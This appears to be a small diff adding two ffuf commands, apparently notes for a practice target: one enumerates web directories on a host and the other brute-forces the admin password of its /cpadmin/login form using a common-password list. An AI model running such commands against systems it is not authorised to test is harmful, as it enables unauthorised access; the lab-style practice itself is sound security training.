@@ -1,0 +1,2 @@
+ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://vulnbegin.co.uk/FUZZ
+ffuf -w /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt -X POST -d "username=admin&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -u http://www.vulnbegin.co.uk/cpadmin/login -mc all -fc 200
